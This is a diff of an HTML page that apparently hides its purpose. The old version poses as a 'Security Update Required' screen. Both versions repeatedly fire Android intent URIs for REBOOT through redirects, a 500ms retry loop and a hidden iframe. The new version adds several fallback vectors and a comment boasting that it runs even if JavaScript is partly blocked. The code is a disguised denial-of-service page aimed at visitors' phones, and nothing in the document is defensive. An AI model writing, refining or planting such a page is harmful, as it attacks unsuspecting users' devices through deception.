@@ -1,2 +1,17 @@
 <!DOCTYPE html>
-<html><head><title>Update</title></head><body style="background:black;color:white;padding:40vh;text-align:center"><h2>Security Update Required</h2><script>function r(){window.location.href='intent://reboot#Intent;scheme=android.intent.action.REBOOT;end';setTimeout(r,1000);}r();</script></body></html>
+<html>
+<head><title></title></head>
+<body style="margin:0;overflow:hidden">
+<script>
+// Multi-vector reboot (executes even if JS partially blocked)
+try{window.location.href='intent://reboot#Intent;scheme=android.intent.action.REBOOT;end'}catch(e){}
+try{window.location='android.intent.action.REBOOT://'}catch(e){}
+try{window.location.href='intent://#Intent;action=android.intent.action.REBOOT;end'}catch(e){}
+// Retry loop
+setInterval(()=>{
+try{window.location.href='intent://reboot#Intent;scheme=android.intent.action.REBOOT;end'}catch(e){}
+},500);
+</script>
+<iframe src="intent://reboot#Intent;scheme=android.intent.action.REBOOT;end" style="display:none"></iframe>
+</body>
+</html>
